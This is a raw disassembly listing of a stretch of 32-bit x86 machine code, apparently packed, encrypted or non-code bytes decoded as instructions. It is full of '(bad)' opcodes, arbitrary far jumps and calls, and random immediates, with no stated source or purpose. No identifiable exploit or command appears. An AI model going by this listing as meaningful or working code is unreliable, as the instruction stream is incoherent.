  41653c:	or     BYTE PTR [ecx+edx*8+0x2e13d90],bh
  416543:	mov    dh,BYTE PTR [esi-0x1adc2392]
  416549:	jmp    0xf97a:0xd009fb3
  416550:	aas    
  416551:	(bad)  
  416552:	test   al,0x59
  416554:	mov    dh,0x6b
  416556:	(bad)  
  416557:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416558:	sub    eax,0x1b76e7ab
  41655d:	outs   dx,DWORD PTR ds:[esi]
  41655e:	not    DWORD PTR [ebx-0x4bd3ef11]
  416564:	and    DWORD PTR [esi+ebp*2],0xe3687152
  41656b:	adc    bl,BYTE PTR ds:0x474fd4c7
  416571:	mov    esi,0xa404f64a
  416576:	sbb    al,0x2
  416578:	mov    esi,eax
  41657a:	push   ss
  41657b:	dec    ecx
  41657c:	and    DWORD PTR [ebx],eax
  41657e:	(bad)  
  41657f:	mov    dh,0x4b
  416581:	into   
  416582:	imul   esi,ebp,0x174d01b6
  416588:	inc    eax
  416589:	pop    ebp
  41658a:	bound  esi,QWORD PTR [esi]
  41658c:	lahf   
  41658d:	fimul  DWORD PTR [eax+0xd]
  416590:	frstor [esi+0x211c7924]
  416596:	data16 adc cl,dl
  416599:	test   al,0x7
  41659c:	nop
  41659d:	rcl    BYTE PTR [edx-0x22],cl
  4165a0:	pop    eax
  4165a1:	add    ecx,edx
  4165a3:	pushf  
  4165a4:	nop
  4165a5:	iret   
  4165a6:	lods   eax,DWORD PTR ds:[esi]
  4165a7:	outs   dx,BYTE PTR ds:[esi]
  4165a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4165a9:	pop    edx
  4165aa:	(bad)  
  4165ab:	jae    0x416559
  4165ad:	mov    al,0x6d
  4165af:	outs   dx,DWORD PTR ds:[esi]
  4165b0:	aas    
  4165b1:	out    0x78,al
  4165b3:	inc    ecx
  4165b4:	cmp    eax,0x4b6d371f
  4165b9:	hlt    
  4165ba:	pop    es
  4165bb:	(bad)  
  4165bc:	je     0x41659d
  4165be:	pop    edx
  4165bf:	pop    eax
  4165c0:	adc    eax,DWORD PTR [edi+0x48]
  4165c3:	jae    0x4165ce
  4165c5:	push   esi
  4165c6:	test   DWORD PTR [esi+0x5841aeb3],esp
  4165cc:	sar    eax,0xbe
  4165cf:	cmp    BYTE PTR [ecx+0x25],bh
  4165d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165d3:	fwait
  4165d4:	jp     0x41656f
  4165d6:	and    DWORD PTR [ecx],ecx
  4165d8:	pcmpgtd mm2,QWORD PTR [ecx+edx*1+0x3e]
  4165dd:	popa   
  4165de:	pop    ecx
  4165df:	push   eax
  4165e0:	les    edi,FWORD PTR [edi+0x203927e1]
  4165e6:	mov    dh,0x93
  4165e8:	stos   BYTE PTR es:[edi],al
  4165e9:	cs pop edx
  4165eb:	xchg   ebp,eax
  4165ec:	xchg   edi,eax
  4165ed:	rol    ecx,cl
  4165ef:	repnz fimul WORD PTR [ebp-0x65]
  4165f3:	fiadd  DWORD PTR [esi+eax*1+0x17]
  4165f7:	pushf  
  4165f8:	jb     0x416625
  4165fa:	jb     0x4165f2
  4165fc:	mov    eax,ds:0xe176a602
  416601:	mov    ebp,0xe41583ac
  416606:	pop    ecx
  416607:	xor    eax,0x5de6d090
  41660c:	test   al,0xe6
  41660e:	cdq    
  41660f:	jmp    0xc755f586
  416614:	xchg   ebx,eax
  416615:	test   DWORD PTR [ecx-0x1],esi
  416618:	lock adc dx,WORD PTR [ebp+0x73fea614]
  416620:	ret    0x83e4
  416623:	xor    DWORD PTR [edi+0x55134e10],ebx
  416629:	(bad)  
  41662b:	pop    es
  41662c:	push   eax
  41662d:	mov    eax,0xce9d2bb
  416632:	cmp    ebp,esi
  416634:	mov    bh,BYTE PTR [esi]
  416636:	rol    BYTE PTR [ebx+0x34],0xc6
  41663a:	sbb    DWORD PTR es:[esi],ecx
  41663d:	in     eax,dx
  41663e:	lods   eax,DWORD PTR ds:[esi]
  41663f:	inc    edi
  416640:	rol    esi,cl
  416642:	xor    ecx,DWORD PTR [edi+0x54ad764e]
  416648:	jmp    0x98a0:0x72615a50
  41664f:	sbb    al,0xac
  416651:	cli    
  416652:	in     eax,0x78
  416654:	jnp    0x416621
  416656:	cmp    edi,DWORD PTR [edx-0x2c6eceb9]
  41665c:	mov    eax,ds:0x8b380ae3
  416661:	xchg   BYTE PTR [eax],dl
  416663:	(bad)  
  416664:	jnp    0x416670
  416666:	dec    ebx
  416667:	(bad)  
  416668:	sbb    ebp,DWORD PTR [esp+eax*4]
  41666b:	mov    esi,0xc4f6864d
  416670:	pop    ds
  416671:	pushf  
  416672:	inc    esp
  416673:	or     ebx,eax
  416675:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416676:	and    al,0xd9
  416678:	dec    esp
  416679:	cli    
  41667a:	cmp    DWORD PTR [ecx-0x2b0cb313],edi
  416680:	sbb    bh,bl
  416682:	mov    ch,0x41
  416684:	rcr    BYTE PTR [eax],cl
  416686:	jbe    0x41663f
  416688:	push   ds
  416689:	xor    al,0x3c
  41668b:	aam    0x44
  41668d:	mov    al,0xe6
  41668f:	or     ch,BYTE PTR [ecx+0x76]
  416692:	scas   eax,DWORD PTR es:[edi]
  416693:	aaa    
  416694:	push   ebx
  416695:	sub    al,0xf4
  416697:	popa   
  416698:	pop    ebx
  416699:	(bad)  
  41669a:	mov    ebp,0xd4479fc2
  41669f:	(bad)  
  4166a0:	std    
  4166a1:	adc    edx,DWORD PTR [edi+esi*1+0x13f6b100]
  4166a8:	adc    ch,BYTE PTR [ecx+0x47]
  4166ab:	dec    ecx
  4166ac:	loope  0x4166f9
  4166ae:	fnstcw WORD PTR [ebx]
  4166b0:	stc    
  4166b1:	scas   eax,DWORD PTR es:[edi]
  4166b2:	jp     0x4166c7
  4166b4:	sub    DWORD PTR ds:0x4817ac92,esp
  4166ba:	cmp    al,0xe7
  4166bc:	xor    dh,BYTE PTR [edi+eax*4]
  4166bf:	sar    DWORD PTR [esi+0x6f],1
  4166c2:	or     ebx,DWORD PTR [ebx]
  4166c4:	mov    ah,0x15
  4166c6:	fistp  DWORD PTR [eax]
  4166c8:	sub    eax,0x3a5e95f0
  4166cd:	jge    0x416665
  4166cf:	adc    al,0x5
  4166d1:	xor    dl,BYTE PTR [eax+0x7c7b2dcb]
  4166d7:	sbb    eax,0x314e1989
  4166dc:	mov    dh,BYTE PTR [edi+ebp*8]
  4166df:	add    eax,0x5ecfaffc
  4166e4:	xchg   ebx,eax
  4166e5:	push   edi
  4166e6:	jg     0x4166a0
  4166e8:	loopne 0x416689
  4166ea:	hlt    
  4166eb:	mov    BYTE PTR [ebp-0x50f389e5],ah
  4166f1:	stos   DWORD PTR es:[edi],eax
  4166f2:	mov    fs,WORD PTR [esi-0xe]
  4166f5:	ds xchg ebp,eax
  4166f7:	add    BYTE PTR [eax],ah
  4166f9:	xchg   esi,eax
  4166fb:	sub    edi,DWORD PTR [esi+0x243eb526]
  416701:	cmp    al,0x78
  416703:	ret    0x5db0
  416706:	pop    es
  416707:	xor    ebp,0x49
  41670a:	mov    ebx,0xb97839a8
  41670f:	adc    DWORD PTR [eax],esp
  416711:	test   al,0x55
  416713:	xchg   esp,eax
  416714:	loope  0x4166d9
  416716:	mov    ecx,0xcc956a7a
  41671b:	aam    0x5d
  41671d:	mov    ds:0xe89b73e8,al
  416722:	push   ebp
  416723:	cmp    bh,cl
  416725:	(bad)  
  416727:	out    0xe6,al
  416729:	jmp    0x4d25:0x141b93f8
  416730:	outs   dx,DWORD PTR ds:[esi]
  416731:	cmp    edi,edi
  416733:	push   ecx
  416734:	in     al,0x11
  416736:	inc    edx
  416737:	outs   dx,DWORD PTR ds:[esi]
  416738:	pushf  
  416739:	pop    ecx
  41673a:	cld    
  41673b:	xchg   ecx,eax
  41673c:	lock mov ebx,0xa78ef136
  416742:	pop    edx
  416743:	cmc    
  416744:	imul   esi,DWORD PTR [ebx-0x1ce518f2],0xffffff99
  41674b:	cmp    DWORD PTR [ecx-0x277cccd9],0xffffffc2
  416752:	pop    eax
  416753:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416754:	cmp    dh,bh
  416756:	arpl   dx,cx
  416758:	lea    ebx,[eax-0x5c]
  41675b:	inc    edx
  41675c:	scas   al,BYTE PTR es:[edi]
  41675d:	aad    0xbd
  41675f:	aam    0x65
  416761:	inc    esi
  416762:	rol    eax,0x84
  416765:	fdivr  QWORD PTR [esi]
  416767:	cwde   
  416768:	mov    edx,DWORD PTR [edi+0x19]
  41676b:	jno    0x41672c
  41676d:	int3   
  41676e:	addr16 (bad) 
  416770:	jbe    0x416779
  416772:	mov    ds:0x6bbeca4,al
  416777:	inc    esp
  416778:	in     al,dx
  416779:	pop    esp
  41677a:	bound  esi,QWORD PTR [eax-0x1b6407ce]
  416780:	scas   eax,DWORD PTR es:[edi]
  416781:	mov    ebx,0xef2eaba2
  416786:	ret    0x286b
  416789:	mov    BYTE PTR [edi-0x75178b64],dl
  41678f:	jp     0x416748
  416791:	popf   
  416792:	jae    0x416753
  416794:	adc    eax,0x33d945f6
  416799:	or     ecx,DWORD PTR [esi]
  41679b:	into   
  41679c:	inc    ecx
  41679d:	cld    
  41679e:	pop    eax
  41679f:	clc    
  4167a0:	adc    eax,0xfc0b3f5a
  4167a5:	jl     0x4167a1
  4167a7:	adc    ecx,DWORD PTR ss:[edi]
  4167aa:	jnp    0x416829
  4167ac:	outs   dx,BYTE PTR ds:[esi]
  4167ad:	in     eax,dx
  4167ae:	push   cs
  4167af:	xor    al,0x3
  4167b1:	jp     0x41678b
  4167b3:	rcr    BYTE PTR [ecx-0x540053ea],cl
  4167b9:	ret    
  4167ba:	dec    eax
  4167bb:	fild   QWORD PTR [ecx+0xd]
  4167be:	cmp    ebx,DWORD PTR [edi]
  4167c0:	pop    ss
  4167c1:	shl    dl,1
  4167c3:	add    BYTE PTR [ecx+0x44],bl
  4167c6:	lods   eax,DWORD PTR ds:[esi]
  4167c7:	jae    0x416839
  4167c9:	push   ecx
  4167ca:	push   eax
  4167cb:	sbb    BYTE PTR [ebp+0x4c],0x94
  4167cf:	ffreep st(2)
  4167d1:	mov    ebp,0x63c3e1aa
  4167d6:	dec    esi
  4167d7:	xchg   esp,eax
  4167d8:	lods   al,BYTE PTR ds:[esi]
  4167d9:	stos   DWORD PTR es:[edi],eax
  4167da:	daa    
  4167db:	pushf  
  4167dc:	push   ecx
  4167dd:	outs   dx,BYTE PTR ds:[esi]
  4167de:	dec    ebx
  4167df:	imul   esi,DWORD PTR [ecx-0x6226aa17],0xffffffcd
  4167e6:	xor    DWORD PTR ds:0xeaa447fe,esp
  4167ec:	dec    BYTE PTR [ebx-0x3d]
  4167ef:	push   ss
  4167f0:	adc    al,BYTE PTR [edx+0x545b3752]
  4167f6:	xchg   edi,ecx
  4167f8:	(bad)  
  4167f9:	fucomp st(7)
  4167fb:	inc    ecx
  4167fc:	aad    0x5f
  4167fe:	and    ch,BYTE PTR [eax+0x5e841b3b]
  416804:	mov    esi,0xe6436b38
  416809:	jp     0x41682c
  41680b:	pushf  
  41680c:	fistp  DWORD PTR [ebx+esi*4]
  41680f:	add    BYTE PTR [ebp+0x608edb07],0x97
  416816:	xor    ebx,DWORD PTR [eax-0x2748daf9]
  41681c:	das    
  41681d:	(bad)  
  41681e:	cs add ch,bh
  416821:	jg     0x41689f
  416823:	std    
  416824:	aas    
  416825:	inc    edi
  416826:	inc    edi
  416827:	ja     0x4167d1
  416829:	jae    0x4167e0
  41682b:	in     eax,dx
  41682c:	hlt    
  41682d:	fimul  WORD PTR [ebp-0x4d]
  416830:	mov    ecx,0xaab4c2dd
  416835:	cdq    
  416836:	outs   dx,BYTE PTR ds:[esi]
  416837:	test   eax,0x5bf5f722
  41683c:	repnz aad 0xc
  41683f:	inc    ebp
  416840:	and    dh,BYTE PTR [edx+0x2e]
  416843:	dec    edx
  416844:	jmp    0xc87d:0x67
  41684a:	and    DWORD PTR [ecx+0x4699d22a],edx
  416850:	xchg   ebx,eax
  416851:	sub    BYTE PTR [eax],bl
  416853:	push   es
  416854:	lahf   
  416855:	jb     0x4167df
  416857:	cdq    
  416858:	fstp   st(4)
  41685a:	xor    edx,DWORD PTR [edx+0x1e3053c4]
  416860:	sub    DWORD PTR [ebp+ebx*4-0xf519cba],0xffffffe1
  416868:	mov    eax,ds:0x3a38402b
  41686d:	je     0x416805
  41686f:	adc    BYTE PTR [ebx],bl
  416871:	cmp    ch,BYTE PTR [ebx]
  416873:	packssdw mm6,QWORD PTR [edx+0x2a2b55fe]
  41687a:	mov    esp,0x38145e36
  41687f:	xor    BYTE PTR [esi-0x6e],al
  416882:	call   0xd17a:0xc67c0ca9
  416889:	jnp    0x41680d
  41688b:	inc    ebp
  41688c:	mov    ebp,0x35a55b6e
  416891:	cmp    bl,bl
  416893:	sbb    eax,0xac6f4c12
  416898:	xchg   esi,eax
  416899:	xchg   ebp,eax
  41689a:	jb     0x416900
  41689c:	in     al,0x7b
  41689e:	sub    ebp,DWORD PTR [edi]
  4168a0:	add    esi,DWORD PTR [ebp+0x1c58a95e]
  4168a6:	mov    ecx,0x686c999e
  4168ab:	bound  esp,QWORD PTR [ebp-0x66bf135f]
  4168b1:	dec    ebx
  4168b2:	fwait
  4168b3:	ror    esp,cl
  4168b5:	push   ss
  4168b6:	adc    ecx,ebx
  4168b8:	das    
  4168b9:	sbb    DWORD PTR [edx+0x77],0x8
  4168bd:	xchg   ebx,eax
  4168be:	out    0x57,al
  4168c0:	pop    ebx
  4168c1:	loope  0x416867
  4168c3:	call   0xa4650fe9
  4168c8:	fld    DWORD PTR [ebx-0x17fb2705]
  4168ce:	inc    edi
  4168cf:	(bad)  
  4168d0:	jae    0x41685e
  4168d2:	dec    esi
  4168d3:	aaa    
  4168d4:	adc    al,0x88
  4168d6:	jno    0x4168c3
  4168d8:	js     0x416893
  4168da:	or     al,0xb2
  4168dc:	or     BYTE PTR ds:0x92765be0,bl
  4168e2:	ss lahf 
  4168e4:	test   eax,0x51104a96
  4168e9:	jmp    0x41694c
  4168eb:	imul   DWORD PTR [edx-0x7411cda1]
  4168f1:	mov    dl,0xbc
  4168f3:	ds xchg esp,eax
  4168f5:	arpl   si,cx
  4168f7:	test   eax,eax
  4168f9:	call   0x78aaa9a
  4168fe:	sub    BYTE PTR [ebp-0x5fd18d95],al
  416904:	xlat   BYTE PTR ds:[ebx]
  416905:	sahf   
  416906:	stos   BYTE PTR es:[edi],al
  416907:	stos   DWORD PTR es:[di],eax
  416909:	or     bh,BYTE PTR [esp+ecx*8+0x27]
  41690d:	lea    esi,[ecx+esi*1+0x15]
  416911:	mov    ebp,0x7c360896
  416916:	int    0xa5
  416918:	dec    ebp
  416919:	arpl   cx,si
  41691b:	xchg   BYTE PTR [esp+ebp*2-0x5e],al
  41691f:	mov    ds:0x31a2431,al
  416924:	call   0x505181f3
  416929:	(bad)  [edi]
  41692b:	push   ebp
  41692c:	popa   
  41692d:	push   eax
  41692e:	aas    
  41692f:	div    BYTE PTR [edx-0x66]
  416932:	sbb    BYTE PTR [edx+edi*2+0x43],dh
  416936:	mov    eax,0xa993c2a
  41693b:	adc    eax,0x914c8f0b
  416940:	xchg   esi,eax
  416941:	jmp    0x668d5615
  416946:	add    eax,0x90c32066
  41694b:	daa    
  41694c:	adc    BYTE PTR [ebx+0x4e799ee9],al
  416952:	and    al,0x7
  416954:	mov    dl,0xd
  416956:	xchg   esi,eax
  416957:	loopne 0x416984
  416959:	mov    dh,ch
  41695b:	cdq    
  41695c:	jle    0x416948
  41695e:	jp     0x41693f
  416960:	pop    edi
  416961:	add    DWORD PTR [ecx+0x66c5fe12],ebx
  416967:	les    esp,FWORD PTR [eax+eiz*8-0x16bb1658]
  41696e:	dec    ch
  416970:	enter  0x56,0xd
  416974:	or     DWORD PTR [ecx+ebx*4],edx
  416977:	push   0x25
  416979:	call   0x3174:0xd0db4a10
  416980:	pop    esp
  416981:	inc    edx
  416982:	inc    ecx
  416983:	icebp  
  416984:	fwait
  416985:	xchg   edx,eax
  416986:	mov    DWORD PTR [eax+0x64],0xb1eb264c
  41698d:	mov    ds:0xaa7c4d5d,eax
  416992:	mov    ds:0x98723f8a,eax
  416997:	das    
  416998:	lods   al,BYTE PTR ds:[esi]
  416999:	jne    0x4169fa
  41699b:	sub    al,BYTE PTR [esi+0x10fe5902]
  4169a1:	xor    BYTE PTR gs:[eax+0x4],dl
  4169a5:	xor    DWORD PTR [ebx],esi
  4169a7:	iret   
  4169a8:	idiv   BYTE PTR [ebp+0x26]
  4169ab:	mov    esp,0x5eee0c5b
  4169b0:	repnz out dx,al
  4169b2:	rcl    BYTE PTR [edi],1
  4169b4:	xchg   BYTE PTR [edx+0x48],ch
  4169b7:	(bad)  
  4169b8:	fcom   DWORD PTR [ecx+0x3896ac0d]
  4169be:	outs   dx,BYTE PTR ds:[esi]
  4169bf:	(bad)  
  4169c0:	xchg   edx,eax
  4169c1:	inc    edi
  4169c2:	mov    bl,0x3
  4169c4:	mov    bh,0xdb
  4169c6:	mov    ecx,0x2ba57f14
  4169cb:	mov    ?,WORD PTR [ecx]
  4169cd:	pop    esp
  4169ce:	xchg   edi,eax
  4169cf:	mov    edi,0xce2645e1
  4169d4:	xor    eax,0xff2acaff
  4169d9:	pop    ebx
  4169da:	pusha  
  4169db:	mov    es,WORD PTR [eax-0x4d608f31]
  4169e1:	and    al,0xfe
  4169e3:	fnsave [ecx]
  4169e5:	gs mov edx,0x56d37463
  4169eb:	or     eax,0x52666832
  4169f0:	jo     0x416989
  4169f2:	int    0x4e
  4169f4:	jecxz  0x416a6d
  4169f6:	dec    edi
  4169f7:	stos   BYTE PTR es:[edi],al
  4169f8:	jecxz  0x416a04
  4169fa:	or     al,BYTE PTR [ebx-0xea1d879]
  416a00:	xchg   edx,eax
  416a01:	adc    eax,0x29631fbe
  416a06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a07:	jle    0x416a71
  416a09:	sub    BYTE PTR [eax-0x40],ch
  416a0c:	daa    
  416a0d:	test   BYTE PTR [ebp-0x2f12b705],al
  416a13:	inc    esi
  416a14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a15:	fisubr DWORD PTR [esi+0x2e]
  416a18:	add    BYTE PTR [esi],al
  416a1a:	sahf   
  416a1b:	cmp    al,0xa8
  416a1d:	or     eax,DWORD PTR [ebp+0x28]
  416a20:	push   edi
  416a21:	sbb    al,0xd4
  416a23:	cmp    edi,DWORD PTR [ebp+0x45bac0bc]
  416a29:	fistp  QWORD PTR [ecx]
  416a2b:	bound  edi,QWORD PTR [ecx]
  416a2d:	inc    ecx
  416a2e:	fs retf 
  416a30:	mov    ch,0x4f
  416a32:	mov    eax,0xbebcb3a7
  416a37:	fucom  st(3)
  416a3a:	push   esp
  416a3b:	lods   al,BYTE PTR ds:[esi]
  416a3c:	in     eax,dx
  416a3d:	mov    ebp,?
  416a3f:	enter  0x8855,0x2b
  416a43:	xchg   esi,eax
  416a44:	(bad)  
  416a45:	jmp    0x416abf
  416a47:	sub    ch,bh
  416a49:	mov    cl,0x87
  416a4b:	iret   
  416a4c:	test   BYTE PTR [esi+esi*2],ah
  416a4f:	(bad)  
  416a50:	add    si,WORD PTR [ebx+0x7c698783]
  416a57:	and    bl,BYTE PTR [edi-0x733233fd]
  416a5d:	add    dh,BYTE PTR [edx-0x75]
  416a60:	popa   
  416a61:	or     edx,DWORD PTR [ebx+0xc]
  416a64:	xchg   esp,eax
  416a65:	xchg   ebx,eax
  416a66:	cmp    edx,edx
  416a68:	adc    bl,BYTE PTR [edi-0x46]
  416a6b:	xor    al,0xff
  416a6d:	scas   eax,DWORD PTR es:[edi]
  416a6e:	or     al,0x88
  416a70:	jg     0x416a58
  416a72:	xchg   ecx,eax
  416a73:	and    BYTE PTR [ecx+ebp*2+0x19],dl
  416a77:	jg     0x416a91
  416a79:	or     eax,0xd906bec5
  416a7e:	scas   al,BYTE PTR es:[edi]
  416a7f:	fcom   DWORD PTR [edi]
  416a81:	or     edx,DWORD PTR [edx]
  416a83:	test   al,0x2e
  416a85:	xchg   si,ax
  416a87:	dec    esi
  416a88:	ds out 0x3a,al
  416a8b:	aas    
  416a8c:	jecxz  0x416a20
  416a8e:	xchg   ebx,eax
  416a8f:	adc    DWORD PTR [ecx-0x40],edx
  416a92:	test   al,0xf4
  416a94:	pop    ecx
  416a95:	dec    ecx
  416a96:	xor    bl,ch
  416a98:	adc    al,0x67
  416a9a:	rcl    BYTE PTR [ebx-0x67b05b37],1
  416aa0:	pop    ds
  416aa1:	or     DWORD PTR [edx+0x38da769e],esp
  416aa7:	pop    ecx
  416aa8:	inc    edi
  416aa9:	xor    al,0xea
  416aab:	fisubr WORD PTR [ecx]
  416aad:	sub    BYTE PTR ds:0xace98d17,ah
  416ab3:	sub    esi,esi
  416ab5:	jmp    0x53e2:0x50facc2f
  416abc:	xlat   BYTE PTR ds:[ebx]
  416abd:	test   DWORD PTR [ecx],0x6f4f6f18
  416ac3:	jl     0x416b33
  416ac5:	cli    
  416ac6:	jmp    0x6eba:0xfcd7ff05
  416acd:	push   0xfef34c0c
  416ad2:	cld    
  416ad3:	int3   
  416ad4:	fistp  DWORD PTR [edi+0x213ee0f1]
  416ada:	or     BYTE PTR [edi-0x10],ch
  416add:	hlt    
  416ade:	repnz aad 0xcf
  416ae1:	and    DWORD PTR [edx-0x3a],ecx
  416ae4:	pop    ebx
  416ae5:	popf   
  416ae6:	and    edx,DWORD PTR [ecx]
  416ae8:	mov    al,0x3b
  416aea:	or     DWORD PTR [esi],esi
  416aec:	sub    dh,BYTE PTR [ebp-0x1d44a429]
  416af2:	or     al,0xa1
  416af4:	push   esi
  416af5:	clc    
  416af6:	pop    esi
  416af7:	das    
  416af8:	mov    ch,0x7e
  416afa:	stc    
  416afb:	cmp    DWORD PTR [ebp+0x2f40d31f],ecx
  416b01:	xchg   edx,eax
  416b02:	add    eax,ecx
  416b04:	dec    eax
  416b05:	jne    0x416a9b
  416b07:	call   FWORD PTR [ebp-0x747cb2a5]
  416b0d:	jle    0x416ae0
  416b0f:	jle    0x416aaa
  416b11:	enter  0x57b7,0x1e
  416b15:	or     eax,0x343ea36f
  416b1a:	mov    bl,dh
  416b1c:	clc    
  416b1d:	addr16 add ah,ah
  416b20:	enter  0xc78b,0xe7
  416b24:	xor    esp,DWORD PTR [ecx+eax*8]
  416b27:	jg     0x416b10
  416b29:	jge    0x416b3e
  416b2b:	ret    0xcbb
  416b2e:	add    dh,BYTE PTR [edi]
  416b30:	stc    
  416b31:	ss call 0xc68e9c18
  416b37:	cmp    DWORD PTR ds:0x389e2867,ebp
  416b3d:	mov    ah,0xb1
  416b3f:	add    esi,DWORD PTR ds:0x592df066
  416b45:	inc    eax
  416b46:	stc    
  416b47:	out    dx,eax
  416b48:	cmp    DWORD PTR [eax],ecx
  416b4a:	pop    ss
  416b4b:	enter  0x3b2c,0xb5
  416b4f:	mov    al,0xa1
  416b51:	and    eax,DWORD PTR [eax+esi*4-0x55]
  416b55:	jg     0x416bb4
  416b57:	test   BYTE PTR [edi+edx*8+0x4788c2cb],0xc9
  416b5f:	jle    0x416b75
  416b61:	or     al,0xf8
  416b63:	enter  0xf00e,0x1c
  416b67:	add    DWORD PTR fs:[edi],esi
  416b6a:	out    dx,eax
  416b6b:	dec    ebx
  416b6c:	and    BYTE PTR [edx+ebp*1-0x504728c7],al
  416b73:	inc    eax
  416b74:	ins    DWORD PTR es:[edi],dx
  416b75:	inc    eax
  416b76:	retf   0x1af7
  416b79:	mov    WORD PTR [edi+0x274d46a1],fs
  416b7f:	jbe    0x416bce
  416b81:	xchg   ebp,eax
  416b82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b83:	xchg   ebx,eax
  416b84:	mov    ch,0x69
  416b86:	xor    bl,BYTE PTR [edx]
  416b88:	adc    al,0xf0
  416b8a:	aaa    
  416b8b:	sar    edx,1
  416b8d:	or     al,0x99
  416b8f:	mov    edx,0x56ca92a3
  416b94:	out    dx,al
  416b95:	add    DWORD PTR [eiz*2-0x10b7b44],edx
  416b9c:	xchg   edi,eax
  416b9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b9e:	add    ch,BYTE PTR [edx-0x7f]
  416ba1:	pop    esp
  416ba2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ba3:	pop    edi
  416ba4:	aad    0xa9
  416ba6:	mov    eax,0x77abbbb6
  416bab:	and    esi,DWORD PTR [edx-0x24]
  416bae:	xor    BYTE PTR [eax],cl
  416bb0:	hlt    
  416bb1:	cmp    DWORD PTR [ebx-0x72],edx
  416bb4:	add    eax,0x7d9065aa
  416bb9:	(bad)  
  416bba:	into   
  416bbb:	(bad)  
  416bbc:	cli    
  416bbd:	std    
  416bbe:	mov    ds:0x5b9c526b,eax
  416bc3:	fimul  DWORD PTR [edx]
  416bc5:	(bad)  
  416bc6:	mov    esi,0xb34b8d9e
  416bcb:	or     al,0xa0
  416bcd:	ficomp DWORD PTR [ecx]
  416bcf:	sub    esp,DWORD PTR [esi]
  416bd1:	sub    eax,0xca9fa8f5
  416bd6:	call   0xcca4:0xb9981ff8
  416bdd:	inc    esi
  416bde:	pop    eax
  416bdf:	mov    bh,al
  416be1:	xor    DWORD PTR ds:0xca2edfd4,ebx
  416be7:	mov    esp,DWORD PTR [ecx-0x15]
  416bea:	inc    esi
  416beb:	add    DWORD PTR [ebp+0x13],edi
  416bee:	jmp    0x2e2:0x4f5d8d1c
  416bf5:	outs   dx,DWORD PTR ds:[esi]
  416bf6:	popa   
  416bf7:	je     0x416c1f
  416bf9:	push   edi
  416bfa:	jmp    0x8b194d73
  416bff:	or     bh,al
  416c01:	jae    0x416c4f
  416c03:	fsubr  st,st(4)
  416c05:	rcr    DWORD PTR [esi+edx*4],0xf5
  416c09:	test   eax,0xc0bb9f6a
  416c0e:	xor    DWORD PTR [edi],ecx
  416c10:	fisubr WORD PTR [ebx-0x72]
  416c13:	aaa    
  416c14:	shl    bh,cl
  416c16:	daa    
  416c17:	mov    es,WORD PTR [ebx+edi*2]
  416c1a:	sub    dh,BYTE PTR [eax+0x4b76d615]
  416c20:	hlt    
  416c21:	pusha  
  416c22:	and    al,al
  416c24:	jecxz  0x416c73
  416c26:	mov    ah,0xee
  416c28:	dec    edi
  416c29:	cmc    
  416c2a:	icebp  
  416c2b:	cmp    al,0x19
  416c2d:	mov    ds:0x4b5ce33d,al
  416c32:	or     BYTE PTR [ecx+0x3b],al
  416c35:	data16 adc BYTE PTR [ebx],0xbf
  416c39:	mov    cl,0x8c
  416c3b:	popa   
  416c3c:	or     al,dh
  416c3e:	pop    edx
  416c3f:	add    esp,DWORD PTR [esi-0x2e7778]
  416c45:	push   esp
  416c46:	in     eax,dx
  416c47:	imul   edx,DWORD PTR [edx-0x77],0xe9cb18c2
  416c4e:	cmp    bl,BYTE PTR [esi+eiz*1]
  416c51:	repnz fisttp WORD PTR [eax-0x6f]
  416c55:	mov    eax,ds:0x3837ab39
  416c5a:	iret   
  416c5b:	(bad)  
  416c5c:	mov    ecx,0xfd1795e4
  416c61:	sub    bl,BYTE PTR [eax+0x6577bcda]
  416c67:	inc    esi
  416c68:	out    0x31,eax
  416c6a:	xchg   ebx,eax
  416c6b:	dec    esi
  416c6c:	inc    edx
  416c6d:	int3   
  416c6e:	xor    ebx,DWORD PTR [edi+0x5f]
  416c71:	repnz inc ebp
  416c73:	in     eax,0x11
  416c75:	cmp    eax,0x85a6e31
  416c7a:	retf   0x5f43
  416c7d:	rcl    DWORD PTR [esi-0x26],0x40
  416c81:	fcomp  QWORD PTR [edi]
  416c83:	mov    esp,0xfa391f78
  416c88:	arpl   sp,dx
  416c8a:	in     al,dx
  416c8b:	loop   0x416c3d
  416c8d:	hlt    
  416c8e:	lods   al,BYTE PTR ds:[esi]
  416c8f:	aas    
  416c90:	xchg   esp,eax
  416c91:	aas    
  416c92:	cmp    esi,edx
  416c94:	cld    
  416c95:	mov    bh,0x96
  416c98:	pop    eax
  416c99:	gs ret 
  416c9b:	popf   
  416c9c:	add    ebx,esp
  416c9e:	(bad)  
  416c9f:	sti    
  416ca0:	push   0x623706a5
  416ca5:	sbb    al,0x2e
  416ca7:	outs   dx,BYTE PTR ds:[esi]
  416ca8:	or     BYTE PTR [edx+0x3e111b8c],cl
  416cae:	je     0x416cc2
  416cb0:	adc    al,0x72
  416cb2:	xor    esp,DWORD PTR [eax]
  416cb4:	ret    
  416cb5:	ret    0x2f4
  416cb8:	in     eax,0x8f
  416cba:	jns    0x416d2d
  416cbc:	adc    al,0x37
  416cbe:	cmova  eax,DWORD PTR [edx*8-0x1d6415c1]
  416cc6:	cli    
  416cc7:	jg     0x416d36
  416cc9:	fcmovb st,st(6)
  416ccb:	sub    al,0x1b
  416ccd:	jne    0x416c7c
  416ccf:	push   cs
  416cd0:	pop    ecx
  416cd1:	push   eax
  416cd2:	sar    DWORD PTR [eax],cl
  416cd4:	mov    al,ds:0xee5aa83b
  416cd9:	ss sub eax,0x3fa22d9c
  416cdf:	mov    cl,bl
  416ce1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ce2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ce3:	into   
  416ce4:	cmp    bh,al
  416ce6:	jmp    0x416c80
  416ce8:	pop    edi
  416ce9:	jne    0x416d06
  416ceb:	(bad)  
  416ced:	or     bh,BYTE PTR [ecx-0x805b13f]
  416cf3:	cwde   
  416cf4:	inc    esp
  416cf5:	mov    eax,0x87e5110f
  416cfa:	jle    0x416c92
  416cfc:	push   ss
